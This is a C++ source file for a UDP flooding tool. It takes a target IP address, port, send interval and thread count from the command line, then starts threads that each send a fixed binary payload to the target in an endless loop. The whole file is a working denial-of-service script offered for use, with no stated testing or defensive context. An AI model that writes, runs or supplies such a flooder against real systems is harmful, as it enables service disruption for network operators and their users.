#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <thread>
#include <vector>

#define PAYLOAD_SIZE 1024

struct ThreadData {
    std::string ip;
    int port;
    int sleep_time;
    char payload[PAYLOAD_SIZE];
};

void sendPackets(ThreadData data) {
    int sock;
    struct sockaddr_in server_addr;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data.port);
    inet_pton(AF_INET, data.ip.c_str(), &server_addr.sin_addr);

    while (true) {
        sendto(sock, data.payload, strlen(data.payload), 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
        usleep(data.sleep_time * 1000);  // Sleep for specified milliseconds
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time(ms)> <Threads>" << std::endl;
        return EXIT_FAILURE;
    }

    std::string ip = argv[1];
    int port = std::stoi(argv[2]);
    int sleep_time = std::stoi(argv[3]);
    int num_threads = std::stoi(argv[4]);

    ThreadData data;
    data.ip = ip;
    data.port = port;
    data.sleep_time = sleep_time;
    strncpy(data.payload, "\x24\x6C\xAD\xFF\xFF\xEB\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xCD\xF5\x04\x98\x16\x07\x1C\x7F\xC1\x81\x29\x34\xEB", PAYLOAD_SIZE);

    std::vector<std::thread> threads;

    std::cout << "Sending packets to IP: " << ip << ", Port: " << port 
              << ", using " << num_threads << " threads with " << sleep_time << " ms interval" << std::endl;

    for (int i = 0; i < num_threads; ++i) {
        threads.emplace_back(sendPackets, data);
    }

    for (auto& th : threads) {
        if (th.joinable()) {
            th.join();
        }
    }

    return 0;
}